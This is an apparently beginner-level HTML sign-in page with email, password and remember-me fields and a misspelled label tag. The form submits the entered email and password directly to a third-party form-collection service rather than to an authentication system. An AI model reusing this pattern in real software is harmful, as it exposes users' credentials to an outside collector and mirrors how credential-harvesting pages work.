<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign Up</title>
    <link rel="stylesheet" href="Sign in.css" />
  </head>
  <body>
    <form action="https://formspree.io/f/xrgojeyo" method="POST">
      <div class="container">
        <h1>Please sign in</h1>
        <div class="form-group">
          <input
            type="email"
            name="E-Mail"
            id="email"
            placeholder="Email address"
            autocomplete="off"
            required
          />
          <input
            type="password"
            name="Password"
            id="Password"
            placeholder="Password"
            required
            maxlength="20"
            minlength="6"
          />
        </div>
        <div class="form-group2">
          <input type="checkbox" name="remember-me" id="remember-check" />
          <lable for="remember-check">Remember me</lable>
        </div>
        <button type="submit">Sign in</button>
        <p>Copyright &copy; 2021</p>
      </div>
    </form>
  </body>
</html>
